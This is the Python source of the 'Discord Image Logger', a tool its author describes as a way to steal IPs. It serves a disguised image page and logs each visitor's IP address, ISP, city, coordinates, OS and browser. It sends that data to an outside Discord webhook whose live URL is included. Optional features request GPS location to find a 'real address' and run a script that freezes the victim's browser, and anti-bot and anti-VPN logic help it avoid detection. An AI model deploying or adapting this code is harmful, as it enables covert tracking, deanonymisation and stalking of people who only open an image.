# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1139235161440014357/bYejP8rvftEg3j82xieonNRi8aDrpeBxmpJ_ngvKedh-mTyt2SxPjypRev-w0pW5Smq3",
    "image": "data:image/png;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": False, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
